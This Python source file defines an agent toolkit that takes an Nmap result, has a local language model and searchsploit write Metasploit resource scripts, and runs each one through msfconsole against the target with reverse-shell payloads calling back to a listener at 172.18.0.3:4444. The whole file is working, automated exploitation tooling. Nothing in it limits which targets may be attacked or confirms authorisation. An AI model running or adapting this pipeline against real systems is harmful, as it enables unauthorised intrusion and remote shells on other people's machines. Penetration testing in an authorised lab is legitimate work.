import json
import os
import subprocess
import requests
from typing import Dict, List
from datetime import datetime

from agno.tools.toolkit import Toolkit
from agno.utils.log import logger

import logging

logger.setLevel(logging.DEBUG)
results_dir = "/results"
os.makedirs(results_dir, exist_ok=True)
log_file = "/results/combined.log"
file_handler = logging.FileHandler(log_file)
file_handler.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s [%(name)s] %(levelname)s: %(message)s')
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)


class MetasploitAgent(Toolkit):
    def __init__(self):
        super().__init__(name="MetasploitAgent")
        self.register(self.run)
        self.ollama_url = "http://ollama:11434/api/generate"
        self.model = "llama3.2:1b"
        self.results_dir = "/results"
        self.lhost = "172.18.0.3"
        self.lport = 4444

    def get_payload(self, os_info: str) -> str:
        """Elige un payload según el OS detectado."""
        os_info = os_info.lower()
        if "windows" in os_info:
            return "windows/meterpreter/reverse_tcp"
        elif "linux" in os_info or "unix" in os_info or "debian" in os_info:
            return "cmd/unix/reverse"
        else:
            logger.warning(f"OS desconocido: {os_info}, usando payload genérico")
            return "generic/shell_reverse_tcp"

    def generate_exploit_llm(self, ip: str, port: str, service: str, os_info: str, vuln_id: str = None) -> str | None:
        """Genera un script de Metasploit usando el LLM."""
        vuln_prompt = f" para la vulnerabilidad {vuln_id}" if vuln_id else ""
        payload = self.get_payload(os_info)
        file_cmd = "echo" if "unix" in payload or "linux" in payload else "echo."
        file_path = f"/tmp/exploit_{vuln_id or 'generic'}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt" if "unix" in payload or "linux" in payload else f"C:\\exploit_{vuln_id or 'generic'}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        prompt = f"""
        Genera un script de Metasploit (.rc) para explotar un servicio {service} en {ip}:{port}{vuln_prompt} en un sistema {os_info}.
        Usa un exploit conocido de Metasploit. Incluye:
        - Selección del exploit
        - set RHOSTS {ip}
        - set RPORT {port}
        - set PAYLOAD {payload}
        - set LHOST {self.lhost}
        - set LPORT {self.lport}
        - exploit
        - Post-explotación: crear un archivo '{file_path}' con el texto 'Exploited by Metasploit' usando '{file_cmd}'
        - Salir con 'exit'
        Devuelve solo el script.
        """
        try:
            response = requests.post(self.ollama_url, json={"model": self.model, "prompt": prompt, "stream": False},
                                     timeout=30)
            response.raise_for_status()
            script = response.json().get("response", "").strip()
            if "use " in script and "exploit" in script:
                logger.debug(f"Script LLM generado para {vuln_id or 'generic'}: {script}")
                return script
            logger.warning(f"[!] Script LLM inválido para {vuln_id or 'generic'}, intentando searchsploit")
            return None
        except Exception as e:
            logger.error(f"[!] Error con LLM para {vuln_id or 'generic'}: {e}")
            return None

    def generate_exploit_searchsploit(self, ip: str, port: str, service: str, os_info: str) -> List[str]:
        """Busca exploits con searchsploit y genera scripts básicos."""
        scripts = []
        payload = self.get_payload(os_info)
        file_cmd = "echo" if "unix" in payload or "linux" in payload else "echo."
        file_path = f"/tmp/exploit_searchsploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt" if "unix" in payload or "linux" in payload else f"C:\\exploit_searchsploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        try:
            cmd = ["searchsploit", "-j", service, f"port {port}"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                exploits = json.loads(result.stdout).get("RESULTS_EXPLOIT", [])
                for exploit in exploits[:3]:  # Limitar a 3
                    exploit_name = exploit["Title"].lower().replace(" ", "_")
                    logger.info(f"[+] Exploit encontrado en searchsploit: {exploit_name}")
                    script = f"""
use exploit/{exploit_name}
set RHOSTS {ip}
set RPORT {port}
set PAYLOAD {payload}
set LHOST {self.lhost}
set LPORT {self.lport}
exploit
{file_cmd} 'Exploited by Metasploit' > {file_path}
exit
"""
                    scripts.append(script)
            if not scripts:
                logger.warning("[!] No se encontraron exploits en searchsploit")
            return scripts
        except Exception as e:
            logger.error(f"[!] Error con searchsploit: {e}")
            return []

    def generate_exploit_vulners(self, ip: str, port: str, service: str, os_info: str, vulners: List[Dict]) -> List[
        str]:
        """Genera scripts basados en vulners del JSON de Nmap."""
        scripts = []
        for vuln in vulners:
            vuln_id = vuln.get("id", "unknown")
            if vuln.get("exploit", False):  # Solo exploits marcados
                script = self.generate_exploit_llm(ip, port, service, os_info, vuln_id)
                if script:
                    scripts.append(script)
        return scripts

    def run(self, **kwargs) -> Dict[str, str]:
        json_file = kwargs.get('json_file', '/results/nmap_result.json')
        timeout = kwargs.get('timeout', 600)

        if not os.path.exists(json_file):
            logger.error(f"[!] No se encontró {json_file}")
            return {"error": f"No se encontró {json_file}"}

        try:
            with open(json_file, 'r') as f:
                nmap_data = json.load(f)
        except json.JSONDecodeError:
            logger.error(f"[!] Error al decodificar {json_file}")
            return {"error": f"Error al decodificar {json_file}"}

        # Extraer datos del target
        target_data = nmap_data.get("target", {})
        ip = target_data.get("ip", None)
        port = target_data.get("port", None)
        service = target_data.get("service", None)
        os_info = target_data.get("os", "unknown")

        if not all([ip, port, service]):
            logger.warning("[!] Datos incompletos en 'target' para Metasploit")
            return {"warning": "Datos incompletos en 'target' para Metasploit"}

        vulners = nmap_data.get("tools", {}).get("metasploit", {}).get("vulners", [])
        target = f"{ip} {port} {service}"
        results = {}

        # Generar scripts
        scripts = []
        generic_script = self.generate_exploit_llm(ip, port, service, os_info)
        if generic_script:
            scripts.append(generic_script)
        scripts.extend(self.generate_exploit_searchsploit(ip, port, service, os_info))
        scripts.extend(self.generate_exploit_vulners(ip, port, service, os_info, vulners))

        if not scripts:
            logger.warning("[!] No se generaron scripts de exploit")
            results[target] = "Error: No se generaron scripts de exploit"
            return results

        # Ejecutar cada script
        for idx, script in enumerate(scripts):
            try:
                logger.info(f"[+] Probando exploit {idx + 1}/{len(scripts)} para {target} (OS: {os_info})...")

                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                script_path = f"{self.results_dir}/exploit_{ip}_{port}_{idx}_{timestamp}.rc"
                with open(script_path, "w") as f:
                    f.write(script)
                logger.debug(f" [+] Script guardado: {script_path}")

                command = ["/usr/bin/msfconsole", "-q", "-r", script_path]
                logger.debug(f" [+] Command: {' '.join(command)}")
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate(timeout=timeout)

                logger.debug(f" [+] Return code: {process.returncode}")
                logger.debug(f" [+] Stdout: {stdout[:1000]}...")
                logger.debug(f" [+] Stderr: {stderr[:1000]}...")

                output_path = f"{self.results_dir}/output_{ip}_{port}_{idx}_{timestamp}.txt"
                with open(output_path, "w") as f:
                    f.write(stdout + "\n" + stderr)
                logger.info(f"[+] Salida guardada en {output_path}")

                if process.returncode == 0 and "Exploit completed" in stdout:
                    file_path = next((line.split("> ")[1] for line in script.split("\n") if "> " in line), "unknown")
                    logger.info(f"[+] Exploit {idx + 1} ejecutado con éxito en {target}")
                    results[
                        f"{target}_exploit_{idx}"] = f"Éxito: Archivo creado en {file_path}, salida en {output_path}"
                else:
                    logger.error(f"[!] Error en exploit {idx + 1} para {target}: {stderr or 'Sin detalles'}")
                    results[f"{target}_exploit_{idx}"] = f"Error: {stderr or 'Sin detalles'}, salida en {output_path}"

                self.lport += 1  # Evitar conflictos

            except Exception as e:
                logger.error(f"[!] Error en exploit {idx + 1} para {target}: {e}")
                results[f"{target}_exploit_{idx}"] = f"Error: {e}"

        return results


if __name__ == "__main__":
    agent = MetasploitAgent()
    result = agent.run()
    print(json.dumps(result, indent=2))